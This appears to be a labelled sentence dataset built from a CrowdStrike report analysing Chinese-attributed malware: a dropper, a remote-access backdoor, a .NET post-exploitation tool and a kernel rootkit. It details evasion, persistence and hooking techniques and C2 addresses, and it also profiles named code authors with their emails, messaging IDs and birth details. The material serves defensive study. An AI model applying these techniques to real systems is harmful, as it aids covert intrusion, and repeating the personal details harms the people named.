In late December 2011 , CrowdStrike , Inc. received three binary executable files that were suspected of having been involved in a sophisticted attack against a large Fortune 500 company .	0
The files were analyzed to understand first if they were in fact malicious , and the level of sophistication of the samples .	0
The samples were clearly malicious and varied in sophistication .	0
All three samples provided remote access to the attacker , via two Command and Control ( C2 ) servers .	1
One sample is typical of what is commonly referred to as a 'dropper ' because its primary purpose is to write a malicious component to disk and connect it to the targeted hosts operating system .	1
The malicious component in this case is what is commonly referred to as a Remote Access Tool ( RAT ) , this RAT is manifested as a Dynamic Link Library ( DLL ) installed as a service .	1
The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems , download additional tools , remove log data , and itself be used as a backdoor .	1
The third sample was a sophisticated implant that in addition to having multiple communication capabilities , and the ability to act as a relay for other infected hosts , utilized a kernel mode driver that can hide aspects of the tool from user-mode tools .	1
This third component is likely used for long-term implantation and intelligence gathering .	1
Some AV engines occasionally identify this sample as Derusbi Trojan .	0
CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT , including 64-bit versions , used in targeted attacks in 2011 against Defense , Energy/Power , and Chemical Industries in US and Japan .	0
All of these samples reflect common toolmarks and tradecraft consistent with Chinese based actors who target various strategic interests of the United States including High Tech/Heavy Industry , Non-Governmental Organizations ( NGOs ) , State/Federal Government , Defense Industrial Base ( DIB ) , and organizations with vast economic interests .	0
This report contains an in-depth technical analysis of the samples , detection/remediation/mitigation information , attribution intelligence , and a conclusion aimed at providing the reader with a synopsis of the report .	0
The executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a 'dropper ' , which is designed with the purpose of extracting from itself a malicious payload and to initialize and install it into a targeted system .	1
In this case , the malicious payload is a Dynamic-Link Library ( DLL ) , which enables an attacker to have full control of the system .	1
This code appears to have been compiled on Wednesday May 4th , 2011 at 11:04:24 A.M. UTC ( equivalent to early evening time in China ) .	0
Note that the timestamp is in UTC , however the relative time of day in China is provided for the benefit of the reader .	0
The sample first resolves several library functions provided by Microsoft using the LoadLibrary ( ) and GetProcAddress ( ) Application Programming Interfaces ( APIs ) .	1
The imported function names are not encrypted ; however , the function name is minutely obfuscated by a simple single character substitution : The dropper invokes the SHGetSpecialFolderPath ( ) API supplying a Constant Special Item ID List ( CSIDL ) of 'CSIDLCOMMONDOCUMENTS ' to identify the destination folder for the malicious DLL payload .	1
The CSIDL in this case pints to : '' The file system directory that contains documents that are common to all users .	0
A typical path is C : \Documents and Settings\All Users\Documents .	0
'' The dropper attempts to write the malicious payload to one of the following names , using the first available name in this set : The dropper sets the creation and last written timestamp of the newly created file to the date 2007-03-07 00:00:00 ; this allows the newly created malicious DLL to blend in with other system files .	1
This is meant to prevent identification during disk forensics using a common investigative technique called a forensic analysis timeline .	1
This date is specified in the dropper code and does not change across multiple infections .	0
The malicious DLL file that is dropped is hidden in a resource of the dropper binary .	1
This is a relatively common technique used by malware dropper files to optimize the number of files required to infect a machine .	0
The resource language of the malicious DLL is set to '' Chinese ( Simplified ) '' , this is a compiler artifact which indicates the language setting on the compiler used by the person who built the binary was set to '' Chinese ( Simplified ) '' at the time the dropper was compiled .	0
The 'MZ ' header which denotes a binary executable file of the dropped DLL is initially obfuscated .	0
When the dropper writes the file to disk , the first byte of the file is 'Z ' which prevents the file from executing or being detected as an executable by many defensive tools .	1
The dropper subsequently opens the dropped file and corrects the header by writing the 'M ' over the first byte , allowing the file to be executed .	1
A subroutine to decompress the dropped file is present as 'dead code ' ( code that is not used ) in the binary .	0
This subroutine will be invoked on the already closed file handle of the dropped file in the present code version .	0
Since the dropped resource is not compressed , the routine fails .	0
This indicates a low sophistication modification to the original dropper code to make it work with an uncompressed source .	0
The final step the dropper performs is to load the dropped DLL into its own process space ; it then resolves the export 'OpenINFOPerformanceData ' from the DLL and invokes it with the dropped DLL 's filename as parameter .	1
This export then implements the actual install logic to maintain persistence and invoke the main routine .	1
The dropper binary contains an icon resource that resembles the 'Google Chrome ' browser icon , the re- source language is set to '' Chinese ( Simplified ) '' , which is consistent with the builder of the tool systems language set to Chinese .	0
The use of the Chrome icon may indicate a possible attempt to socially engineer the intended victim into thinking the dropper was a legitimate file associated with Google .	1
This sample is a 'backdoor ' which is the DLL dropped by the dropper sample file with an MD5 of 14c04f88dc97aef3e9b516ef208a2bf5 .	1
This code appears to have been compiled on Wednesday May 4th , 2011 at 10:48:19 A.M. UTC ( equivalent to early evening time in China ) .	0
It is instantiated when it is mapped into the process space of its dropped file , and its ' export named 'OpenINFOPerformanceData ' is called .	1
This export first attempts to stop a service called '' msupdate '' , which is not a known Microsoft Windows service despite the appearance .	0
If the service is present , the malware replaces its previous instances or versions of this backdoor .	1
After attempting to disable the existing service , the malware tries to install itself as a service with that same name .	1
During installation , the sample attempts to use documented APIs such as OpenSCManager ( ) and CreateService ( ) to initialize itself as a persistent Windows service .	1
As a precaution , the sample writes settings directly to the Windows Registry to accomplish the same goal if installing the service with the documented APIs fails .	1
The registry change creates the following key : Following this , the subroutine will set the value of the 'ServiceDLL ' to the module handle of the DLL .	1
The next key to be changed is : HKEYLOCALMACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost , which will have the 'msupdate ' key set to 'msupdate ' .	1
The export 'CollectW3PerfData ' is registered as the main function of the DLL .	1
If the installation of the new service is successful , the sample then starts the new service and exits .	1
If the installation fails , the sample spawns a new process using rundll32.exe , this executable will instantiate the DLL and can call a specific exported function .	1
In the case of installation failure , rundll32.exe calls the main functions export 'CollectW3PerfData ' .	0
The rundll32.exe is instantiated with a new NULL Security Identifier ( SID ) ( S-1-0-0 ) with permissions set to grant all access to the file .	1
This allows any user to have complete control over the machine , as rundll32.exe is frequently launched by tasks such as changing the time , wallpaper , or other system settings .	1
This means that after cleaning up the components dropped by the malware , the system remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with a malicious version and await it 's automatic execution by the Operating System .	1
The main entry point to the DLL is named 'CollectW3PerfData ' , as it first creates and displays a fake Window with class '' NOD32 % d '' where % d is replaced with a pseudo-random number .	0
This may be an attempt to fool some automated dynamic analysis or anti-malware software into believing this is the legitimate ESET AV software .	1
The window is however not visible and implements no specific functionality .	0
After creating this window , the routine starts the main thread that eventually initiates calling out to the Command and Control ( C2 ) .	1
In order to accomplish this task , the newly created thread initializes networking APIs using WSAStartup ( ) and resolves some other APIs dynamically using LoadLibrary ( ) and GetProcAddress ( ) .	0
Once the proper API 's have been resolved , the sample then assigns a NULL SID to the rundll32.exe executable and sets the current process ' Window Station to '' winsta0 '' , which enables the sample to access the real user 's desktop if started as service .	1
The communication to the C2 is handled by a while ( ) loop , with each successive connection attempt causing the loop to invoke the Windows Sleep ( ) API for a time interval of 2 seconds , exponentially increasing in length up to 1024 seconds ( 17 minutes ) and then restarting back to 2 seconds .	1
The C2 location in this sample is statically defined as 1.9.5.38:443 ( Malaysia : Tmnet , Telekom Malaysia Bhd ) .	0
While ther is 'dead code ' that will download the C2 location from an HTTP URL that could be defined in the binary , using the User-Agent string '' Google '' , this code is not activated due to the format of the stat- ically defined C2 location using an IP address .	0
Thus the sample will only attempt to connect directly using a raw socket to the C2 located at 1.9.5.38:443 .	1
This indicates the use of a 'boiler plate code ' or a builder software package that automates the creation of the malicious sample .	0
The malicious sample sends an initial beacon to the C2 that includes the following information : The beacon is encrypted using an XOR/ADD loop using the statically defined key 0x1C and sent to the C2 .	1
The following python function can be used to decode the beacon stings : After sending the initial beacon , the routine loops receiving incoming commands and executes them in sequence .	1
When a connection can successfully be established to the C2 server , the sleep timer is reset to two seconds for the next attempt .	0
The network protocol used by this sample resembles a 'Type-Length-Value ' layout in both directions .	0
Each 16 byte request header consists of : Zero or more of specified bytes of additional payload then follows the header .	0
This inbound payload is received unconditionally and regardless of command type into a fixed-size stack buffer of 408 bytes size .	1
Providing additional payload of any larger size will result in a trivial exploitable stack buffer overflow that allows arbitrary code execution due to the absence of any security features .	0
However , exploitation of this vulnerability is unnecessary due to the already available unauthenticated command execution capabilities of this backdoor .	0
Certain commands initiate a second connection to the C2 in a separate thread using the same network protocol but providing a different request command identifier than for the initial beacon .	0
The primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote Desktop over a custom protocol .	1
It allows the adversary to view the main desktop graphically and control the keyboard and mouse .	1
This remote control functionality is implemented as separate messages for mouse clicks , pressed keys , etc .	1
using command identifiers 0x20000002 to 0x20000019 .	1
The command 0x22000001 initiates continuous transmission of screen captures to the C2 .	1
The screen captures are created using a series of Microsoft Windows Graphic Device Interface ( GDI ) API calls culminating in a call to GetDIBits ( ) .	1
Command 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor from the system .	1
When command 0x23000004 is received , a temporary new user '' DomainUser '' with password '' Dom4 ! nU- serP4ss '' is created and added to the local Administrators group .	1
The backdoor is then started under that account and the user is deleted .	1
It would appear this technique is meant to obfuscate the activities of the malicious sample by masking the process creator 's user name to appear to be a generic domain user .	1
Note that such an account does not normally exist in an Active Directory environment .	0
Additionally , the primary C2 connection allows for requests to start additional connections to the C2 imple- menting the following functionality : This sample is typical of a post exploitation tool ; it is written in .NET	0
2.0 .	0
This code appears to have been compiled on Thursday May 26th , 2011 at 10:21:44 A.M. UTC ( early evening time in China ) .	0
The backdoor functionality can be instantiated either directly from the command line or through commands issued over a network based protocol via the C2 .	1
If no arguments are given , a connection to the C2 is initiated to the stati- cally defined IP address .	1
The command line options support post exploitation capabilities such as changing file timestamps , forensic mitigation , privilege escalation , launching the executable , and specifying a specific C2 .	1
One interesting command line option allows the backdoor to filter the contents of specified files to remove content using a regular expression ( regex ) .	1
This command then modifies the creation , modification , and last access timestamps of the modified file to conceal the content modifications .	1
A detailed listing of command line arguments can be viewed in Appendix A .	0
This activity is generally associated with log cleaning to com- plicate a forensic investigation .	1
The sample contains an embedded IP address for C2 that is stored in an encrypted format as a string re- source : The first two bytes of this string represent the base 16 length of the encrypted string , in this case , '' 0x14 '' .	0
Following this is a base64 encoded string of the specified length .	0
Once this string has been decoded using base64 , the result is then XOR 'd with the fixed value of 0xAA yielding the decoded IP address 202.86.190.3:80 ( Hong Kong : TeleOne ( HK ) Limited ) .	0
There are three components to the protocol : Authentication is accomplished using a 32 byte packet , this packet consists of : An example authentication packet sent to the C2 is located in Appendix E. After sending the initial authentication packet , the sample verifies that the first four bytes of the response is equal to a statically defined value , in this sample the value is : 0x16030100 .	1
In addition , an 8 byte key is sent to the client which is then RC4 encrypted using the random number generated in step 2 from above as the password .	1
This value is then transformed using a simple algorithm in Appendix F into a 32 byte array .	0
The first 16 bytes of this array are then used as the KEY and the second 16 bytes are used as the IV for setting up AES encryption which is then used to encrypt and decrypt any further communications .	1
Beacon , this is typical of this type of malicious sample , it allows the operator to separate various infected hosts in a targeted campaign .	0
The beacon for this sample is formatted as XML and consists of : An example of an unencrypted beacon : Command handling loop , this is a loop structure that will process and execute commands sent by the C2 .	1
The malware sends and receives a heartbeat/keepalive packet every 2 minutes .	1
The command format is derived from a structure consisting of : These fields are received as a sequence of serialized .NET	0
objects in the order specified .	0
A detailed description of the possible values for commands is in Appendix D. It is important to note that the order in which the application defines them is not the same order as they appear to be coming over the network .	0
Examples of implemented commands include download and upload files , installing new .NET assemblies , calling methods on those assemblies , connecting to new C2 servers and executing processes .	1
This sample is a sophisticated backdoor which implements several communications protocols and was developed in C++ .	1
This binary is compiled with the /GS flag using Visual Studio 2010 , enabling stack buffer overflow detection .	0
This code appears to have been compiled on Sunday October 30 , 2011 at 12:43:33 P.M. UTC ( late evening time in China ) .	0
The code contains several Run Time Type Information ( RTTI ) artifacts that indicate most of the C++ class names were prefixed with the string '' PCC '' in the original source code .	0
Variants of this Trojan are sometimes detected under the name 'Derusbi ' by Microsoft , Trend , Sophos and Symantec AV engines .	0
This sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide an interactive command line shell to the C2 .	1
It also is able to bypass User Account Control ( UAC ) to install itself by using the 'sysprep.exe ' Microsoft Windows executable provided by the targeted system .	1
The steps it takes to install itself onto a system are as follows : 2 .	0
After it copies itself , it will modify the creation time , last access time and last modification time to the current system time when the copy was made but with the year changed to 2005 .	1
3 .	0
Adds itself as a service name from the backdoor 's configuration under HKEYLOCAL MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ < service > '' This defaults to '' wuauserv '' , the legitimate Windows Update service , in the given binary 's default configuration .	1
4 .	0
Adds itself to list of services started by 'netsvc ' using the service name 'helpsvc ' .	1
5 .	0
If McAfee AV is installed , creates a copy of regsvr32.exe named Update.exe and then schedules the copy to be deleted on reboot using the well documented MoveFileExA API .	1
6 .	0
It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to the copy of itself it made in Step 1 .	0
The /u parameter means '' uninstall '' , which calls DllUnregisterServer , this is an unsophisticated method of DLL entry point obfuscation .	0
7 .	0
DllUnregisterServer installs the driver and initiates the backdoor component .	0
The sample is capable of 'dropping ' an embedded/encrypted kernel driver .	1
If the process '' ZhuDongFangYu .	0
exe '' is running ( AntiVirus360 program from the Chinese 'Quihoo 360 Technology Co. , LTD ' 360 ) , or the username of the DLL 's host process context is not 'SYSTEM ' , the driver is not written to disk .	0
Barring the two aforementioned conditions , the sample decrypts the kernel driver to : Following the decryption and writing of the driver to disk , it is loaded using the ZwLoadDriver ( ) API .	1
The driv- er is encrypted with a simple four byte XOR key value of 0x2E885Df3 ; after decryption the file has the MD5 hash of dae6b9b3b8e39b08b10a51a6457444d8 .	1
The malware contains a dynamic configuration stored in the Registry under and loads a default configuration embedded into the binary if such a configuration is not found .	0
The way this default configuration is loaded and parsed indicates that this malware has been built with a 'builder ' that takes a template sample and lets an unsophisticated user specify a configuration without recompiling any code .	0
If the current service name matches a set of pre-defined service names that legitimately exist in Windows , the backdoor then loads the original service 's DLL into the address space with LoadLibrary and invokes the ServiceMain export .	1
This effectively hijacks the original service 's entry while retaining its functionality .	0
While there is code in the binary that allows downloading a list of C2 servers from an HTTP URL , the default configuration present specifies 202.86.190.3:80 as a C2 to use , this is the same Hong Kong C2 server as the one used by the post exploitation .NET	1
tool .	0
The malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one can be bundled in two different 'dual ' modes ( see 3 .	1
) , totaling 7 distinct supported C2 mechanisms .	0
The con- figuration contains the C2 protocol to be used or optionally a self-configuration mode in which the malware attempts the different C2 protocols in a pre-defined order .	1
In self-configuration , a connection via a proxy is attempted if the system wide Internet Explorer settings specify such a proxy .	0
The configuration found in this sample is set to automatic self-configuration , resulting in the following mechanisms being tried in this order : 1 .	0
Proprietary binary header ( optionally over an HTTP Proxy using CONNECT mechanism ) ; this protocol consists of 64 random bytes being sent to the C2 .	1
The C2 then responds with 64 bytes where the first four bytes must match the first four sent bytes to establish a connection successfully .	0
The remaining bytes are discarded .	0
Interestingly , the malware stores the first four bytes rotated right by seven bits and compares that value to the seven bits rotated right version of the server 's response , effectively neutralizing the rotation 's effect ; the purpose of this is unclear .	0
2 .	0
A long-running HTTP POST request to the path '' /forum/login.cgi '' with a statically defined HTTP request string including HTTP headers ( optionally over a HTTP Proxy using CONNECT ) .	0
The malware requires the response to start with '' HTTP/1.0 200 '' or '' HTTP/1.1 200 '' and an absence of a '' Connection : close '' header .	0
This one HTTP connection will be used for bi-directional communications , sending chunks of POST payload and receiving chunks of the response , interleaved .	1
3 .	0
Two long-running HTTP requests to the same C2 ( optionally over an HTTP Proxy with original request verb ) , one GET request to '' /Photos/Query.cgi ? loginid= '' followed by a random number and one POST request to '' /Catelog/login1.cgi '' .	0
The GET request serves as a down-stream channel while the POST request serves as a upstream channel .	1
This demonstrates an attempt to use the most efficient communication channel first , falling back to more legitimate appearing channels as required in order to appear Request For Comment ( RFC ) compliant with the HTTP protocol .	0
Additionally , the malware contains a custom DNS client implementation that will use the system 's configured DNS server to tunnel C2 traffic over legitimate DNS .	1
Since this C2 mechanism is not attempted in self-configuration and was not configured for this binary , analysis was left out due to time constraints .	0
After establishing any of the aforementioned channels for arbitrary binary data exchange , the malware will start sending and receiving compressed binary blobs via the channel of choice .	1
The C2 's binary data blobs are compressed .	0
No further encryption of the data takes place .	0
All C2 transport implementations contain code for accepting and handling server-side connections of the respective protocols .	0
However , this code does not appear to be invoked .	0
It appears that the author of this code shares the library that implements these transports for the client with the C2 server .	0
The main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any of the following registered handler classes based upon a command ID .	1
The handler class is responsible for parsing the remainder of the command .	0
This handler class for command ID 8 implements generic directory and file browsing using FindFirstFileW ( ) and FindNextFileW ( ) APIs , as well as reading and writing arbitrary files via C2 commands , thus enabling upload and download of arbitrary files .	1
This is typically seen in RATs for searching specific files to exfiltrate .	1
Additionally , this class implements launching of specified executable files via the CreateProcess ( ) API .	1
This handler class implements a generic TCP proxy .	1
It supports establishing TCP connections to other hosts and also listening for incoming connections .	1
The incoming connection contents are forwarded to the C2 and data from the C2 is passed on to connections .	1
It supports up to 1024 parallel connections .	0
The malware is capable of gathering various pieces of information from the system , triggered by a command ID 10 .	1
The capabilities include recovering authentication credentials from various system and client storage such as Mozilla Firefox , Internet Explorer , and Remote Access Service ( RAS ) .	1
This class also supports gathering intelligence on the infected system including identifying security tools by their process name , proxy accounts , and version numbers for the Operating System ( OS ) and Internet Explorer .	1
This handler class provides the attacker with the ability to manage system components including start / stop / delete system services , enumerate / alter registry keys , and manage running processes .	1
This class also provides the ability for the attacker to take a screen shot of the users desktop .	1
This handler class uses the command ID 5 and implements an interactive command line shell accessible from the C2 server , containing a series of built-in commands .	1
If the input is not in this list of built-in commands , the malware attempts to invoke cmd.exe in the background , launching a command or command line utility already present on the system .	1
The standard output channel of that command is provided back to the C2 .	1
The supported built-in commands are : The only command that is implemented directly in the main backdoor thread as a subprocedure call and not via a generic command handler class is command ID 256 .	0
This command results in the DLL deleting itself and terminating the backdoor process .	1
This sample is a packed 32-bit kernel driver extracted by the aforementioned DLL with an MD5 hash of : de7500fc1065a081180841f32f06a537 , this sample will only function on a Windows 32-bit kernel .	0
This code appears to have been compiled on Sunday October 9 , 2011 at 4:50:31 P.M. UTC ( very early morning time of Monday , October 10 in China ) .	0
This section describes how the driver performs its initialization routine .	0
The driver begins by opening a named event in the BaseNamedObjects object directory with the name { 8CB2ff21-0166-4cf1-BD8F-E190BC7902DC } using the Windows API ZwOpenEvent ( ) .	1
If the event already exists , the driver fails to load , presumably to avoid a multiple instances of itself .	1
If the event does not exist , the driver then creates it using the Windows API ZwCreateEvent ( ) .	1
The Windows API for creating events ( ZwCreateEvent ( ) , or CreateEvent ( ) in user mode ) already provides the ability to '' create-or-open '' an event , so the use of an initial ZwOpenEvent is superfluous and indicative of relatively limited Windows API knowledge of the author of that part of the code .	0
It is interesting to note that some of the hex digits in the object name are mixed case which is potentially indicative of the code being re-appropriated from another source .	0
The second component of the entry point performs an anti-debugging technique , calling the function KdDisableDebugger ( ) , which allows the driver to disable usage of the built-in Windows kernel debugging facility that is used by popular kernel debuggers KD and WinDbg .	1
Tools such as Syser Debugger , or debugging through a virtual machine are unaffected by this technique .	0
The sample , rather than importing the KdDisableDebugger ( ) API using conventional methods , looks up the API through MmGetSystemRoutineAddress ( ) instead .	0
All of the other APIs used by the driver are imported normally , so this is not a technique to hide import APIs used throughout the driver .	0
Searching Google for '' MmGetSystemRoutineAddress '' and '' KdDisableDebugger '' results in dozens of Chinese language blogs which explain how to use this technique to '' Disable WinDbg '' .	0
The final step of the entry point is to begin hooking the system , which is done by two helper functions - one is designed to hook the system call table , while the other hooks the network stack .	1
The network stack hooking first queries the OS version using RtlGetVersion ( ) or PsGetVersion ( ) .	1
Checking the version is necessary because Windows versions beginning with Vista utilize a redesigned TCP/IP net- work stack , most hooking operations will require a different implementation for these versions .	0
On versions prior to Windows Vista , the TCP/IP driver creates a \Device\Tcp device object through which most network requests are piped through .	0
On Vista and later , TCP/IP has been split up into multiple components , and IP connection enumeration , which this driver is targeting , is managed by \Device\nsiproxy instead .	0
In either case , the driver obtains the device object by using IoGetDeviceObjectPointer ( ) and hooks Major Function 14 the IRPMJDEVICECONTROL , as this is the function through which all Input Output ConTroLls ( IOCTLs ) are sent , such as the IOCTL for querying active IP connections .	1
The NSI hook , targets IOCTL 0x12001B , which is used by NsiGetObjectAllParameters ( ) in nsi.dll when users typically run commands such as netstat.exe or use any of the IP Helper APIs in iphlpapi.dll .	0
The purpose of the hook is to scan the list of active connections returned to the user , and hide any such connection currently bound to a local TCP port in the range between 40000 and 45000 .	1
The hooking is performed by creating a new completion routine associated with any IRPMJDEVICECONTROL IRP that matches the IOCTL , attaching to the target process , performing several memory copies to hide the entry , and detaching .	1
This functionality is nearly identical to the code posted by Edward Sun ( aka cardmagic , sunmy1 @ sina.com , onlyonejazz @ hotmail.com , cardcian @ mail.ustc.edu.cn , QQ # 28025945 ) from Hefei , Anhui province ( Nanjing Military District ) on July 8 , 2007 , then a China-based researcher at Trend Micro ( now working at Kingsoft Chinese AV Company ; LinkedIn profile page : http : //www.linkedin.com/profile/view ? id=84082731 ) at http : //forum.eviloctal.com/viewthread.php ? action=printable & tid=29604 ( See Appendix G ) .	0
CrowdStrike has no information connecting Mr. Sun to this intrusion activity , his code appears to have been appropriated by the actor to add similar functionality to their code .	0
The TCP hook works almost identically to the NSI hook , though instead hooking IOCTL 0x120003 ( IOCTL TCPQUERYINFORMATIONEX ) .	1
This IOCTL has the exact same functionality as the NSI specific IOCTL .	0
This IOCTL was the mechanism used on Windows versions prior to Windows Vista .	0
This hook also filters any connections listening on TCP ports in the range between 40000 and 45000 .	1
The system call hooking targets three functions : ZwSaveKey ( ) , ZwQueryValueKey ( ) , and ZwEnumerateValueKey ( ) .	0
The unpacked kernel driver sample hooks these functions by reading the second DWORD at each of these exported functions .	1
Because the system call stub uses the EAX register as an index for the system call ID , and a '' mov eax , imm32 '' instruction '' instruction is used , this second DWORD will match the system call ID .	0
It then adds this index to the value of KeServiceDescriptorTable.Base , which is the exported kernel variable ( on 32-bit Windows only ) which directly points to the system call table .	0
This is one of the simplest ways to do a system call hook , but will not work on 64-bit Windows as this variable is not exported in addition to the protection provided by Microsoft PatchGuard .	0
The system call hook is then performed by first allocating a Memory Descriptor List ( MDL ) using the Windows API IoAllocateMdl ( ) , and associating the MDL to a non-paged buffer using MmBuildMdlForNonPagedPool ( ) .	1
Once the MDL is associated to the non-paged buffer , the sample locks the underlying pages using the Windows API MmProbeAndLockPages ( ) .	0
Instead of hooking the entry in the table directly , which is easily detectable , the driver uses the LDASM open-source disassembly engine to analyze the function that is being pointed to by the table , and applying a Detours-style hook directly in the code .	1
It uses the standard '' mov cr0 , eax '' technique , turning off the Write Protect ( WP ) bit as it does this .	0
When the hook is installed , it writes a special DWORD value , 'KDTR ' , which allows it to prevent double-hooking or badly-hooking the system call , during unhooking , this value is also checked .	0
In the ZwSaveKey ( ) hook , access to \\REGISTRY\\MACHINE\\SYSTEM is blocked .	0
RegSaveKey ( ) which is the user-mode implementation of the kernel ZwSaveKey ( ) API , is typically used when performing an offline backup of a particular registry key .	0
hook is the ZwQueryValueValue ( ) hook , which looks for '' Parameters '' key of a service within the registry at \\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\ .	0
It then checks for the values of the '' ServiceDll '' and '' Security '' keys , in the latter case it applies an XOR on the data with the value 127 .	1
The user-mode component of this malware is a service called '' msupdate '' , this driver is attempting to hide the service .	1
The user-mode service stores configuration data in the '' Security '' subkey of the RPC registry key , this component will obfuscate the user-mode configuration data .	0
The driver does not make any efforts to hide its own key , nor does it specifically check for '' RPC '' before '' Security '' , which can lead to random data being obfuscated .	0
The final hook , ZwEnumerateValueKey ( ) , is similar in structure to the ZwQueryValueHook key , due to the fact that these APIs provide almost identical functionality when it comes to reading registry values .	0
In the registry hooking code of the driver , a call is made to ObReferenceObjectByHandle ( ) .	1
This allows the driver to receive the 'CMKEYOBJECT ' which is then used with ObQueryNameString ( ) to get the key/value path .	0
However , no call to ObDereferenceObject ( ) is ever made , which means that all registry objects being sent to these APIs are eventually leaked .	0
In the registry hook , it was noticed that '' CurrentControlSet001 '' was used as the target , if the target machine was using a '' last known good '' configuration , or a roaming hardware profile , the registry hook would not function as intended .	0
This is the reason the Microsoft implemented a symbolic link to \\CurrentControlSet which ensures that regardless of the machines configuration any request will access the correct registry key .	0
This threat actor leaves several key fingerprints which can be used to identify compromised systems .	0
These digital fingerprints are unique to this adversary for this campaign .	0
The following network signatures are designed for the popular Open Source IDS called Snort .	0
These signature can be ported to other formats upon request .	0
The following file system artifacts are indicative of a compromised host : The following Windows Registry artifacts are indicative of a compromised host : The backdoor may be detected by several different Anti-Virus products under a signature with the name : Attribution in the cyber domain is always a tricky subject when relying solely on malicious samples .	0
Compiler artifacts and language settings can of course be deliberately masked or spoofed .	0
CrowdStrike uses a unique approach of comprehensive threat analysis in order to decipher attributable components .	0
Based on the corroborating evidence discovered in the course of this analysis , it appears there are numerous indications that this is a Chinese-speaking actor .	0
ZhuDongFangYu.exe is a component of 360 360􀆔􀆔􀆔􀆔 , a Chinese security product available from http : //www.360.cn/ .	0
This is particularly relevant in this case because the backdoor DLL sample with an MD5 of de7500fc1065a081180841f32f06a537 specifically avoids installing the kernel driver on a system running this tool .	1
Speculatively this may be because this security product detects this rootkit , or the author was attempting to prevent accidental infection on systems running this Anti-Virus product .	0
The obfuscation of the KdDisableDebugger ( ) function call is seen on several Chinese language forums , and can be seen being reused in several code samples on those forums .	0
As previously mentioned there is no advantage associated with using this call obfuscation , and appears to be reused for no apparent reason other than the attackers have copied code directly from forum code .	0
While the various network hooking techniques used in the kernel driver may appear novel or well researched , upon close inspection it is actually a line-for-line copy of an existing post from the now-offline 'rootkit.com ' by a Chinese language developer .	1
This post is currently mirrored on dozens of Chinese hacking websites .	0
Similarly the system call hooking is less impressive after searching for '' IoAllocateMdl '' and '' cr0 '' ( bbs.pediy .	0
com/showthread.php ? t=77467 perform system call hooking through MDLs .	1
The ldasm inline hooking is also repeated in numerous postings to Chinese forums .	0
One particular website ( http : //read.pudn.com/downloads197/sourcecode/windows/sys- tem/927802/CCRootkit/RootkitSys/HookSSDT.c.htm ) had an almost identical ldasm loop that tried to identify the exact same code sequences .	0
Open source research of the 4 innocuous kernel APIs '' ZwSaveKey ZwQueryValueKey ZwEnumerateValueKey IoAllocateMdl '' , in concert leads directly to a Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs .	1
While the driver does not use pool tags for most of its allocations , it does utilize them in the networking hooking code , much like the examples found on the Chinese language forums .	0
This sample uses pool tags : 'tnet , ' and 'KDTR ' .	0
Although the meaning of the KDTR tag is not obvious , we assess with high confidence that this is a shortened version of : '' Kernel DeTouR '' , which coincides with the matching functionality of the detour-style inline hook .	0
The driver code ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 ) appears to be a combination of various code that is easily searchable on the Internet , and almost always attributed to Chinese language forums and websites .	0
The system call hooking parts of the code appear to be identical to the HookSSDT.c code authored by Steven Lai 'embedlinux ' and utilized in what the author titled 'CC Rootkit ' on on August 4 , 2008 who 's email address is hqulyc @ 126.com .	0
This user has a QQ identity of : 5054-3533 , QQ is a popular instant messaging chat client used almost exclusively in China .	0
His real name according to his QQ profile ( http : //user.qzone.qq.com/50543533 ) appears to be Steven Lai .	0
He was is 28 years old ( born September 5 , 1983 ) and lives in Xiamen , Fujian province ( Nanjing Military Region ) .	0
According to his profile , he has worked at Xiamen XOCECO New Technic Co. , Ltd. ( http : //www.likego.com/en/about.asp ) , a company that builds audio/video systems for transportation systems .	0
Mr. Lai is not being identified as the actor , his code however was used by whomever built the kernel driver utilized by the backdoor and for this reason we are providing the background on this individual .	0
The samples involved in this incident are typical of attacks commonly associated with the People's Republic of China ( PRC ) .	0
These code samples have a variety of Tools , Techniques , and Procedures ( TTPs ) that are used to track and identify specific adversary groups .	0
The sophistication of the actor responsible this incident is difficult to quantify without visibility into the activities that transpired on the victims network .	0
The ability to conduct Incident Response ( IR ) including forensics , and log analysis , greatly augments this visibility into these aspects of the incident .	0
Some indications as to the adversaries ' capabilities can be derived from the captured samples alone .	0
The dropper code ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 ) does not utilize any techniques that are unique or unusual , and is consistent with tools , techniques , and procedures of attacks targeting proprietary information and generally attributed to the PRC .	0
The presence of dead code and its replacement by a more simple obfuscation method to hide the to-be-dropped dll binary file indicates code reuse on the attacker side .	0
The 'dead code ' utilizes a more sophisticated compression algorithm provided by a third party which was rendered useless for some reason .	0
This may have been a result of the attacker modifying an existing tool , or unknowingly using a re-purposed tool .	0
The dropper resources indicate the compiler used to build the tool was running on a system that utilized the Chinese '' Simple '' language pack and was built on Wednesday May 4th , 2011 at 11:04:24 A.M. UTC ( early evening time in China ) .	0
While this can be deliberately spoofed as a 'false flag ' other indicators including the C2 are consistent with this having been the work of a Chinese speaking actor .	0
The dropped DLL ( MD5 : 47619fca20895abc83807321cbb80a3d ) itself contains functionality that is typical of a Remote Access Tool ( RAT ) which are commonly used by PRC based actors in data exfiltration attacks .	1
The code quality is not impressive , and contains a trivial stack buffer overflow vulnerability .	0
Despite the buf- fer overflow , the C2 channel lacks any command authenication or encryption , apart from the initial beacon encryption/obfuscation using a statically compiled XOR key .	0
The sample uses TCP port 443 for commu- nication , but makes no attempt to mimic the SSL protocol typically used on that port number , which would provide enhanced Operational Security ( OPSEC ) .	0
This code appears to have been compiled on Wednes- day May 4th , 2011 at 10:48:19 A.M. UTC ( early evening time in China ) .	0
The post exploitation tool ( MD5 : 2dce7fc3f52a692d8a84a0c182519133 ) is a dual-use tool , it can be dropped and executed by a client-side exploit , or the adversary can launch it using a variety of command line options .	1
This tool is built in Microsoft .NET	0
framework , which is typically an indication of a less sophis- ticated attacker , because .NET	0
is easier to develop in but requires the .NET	0
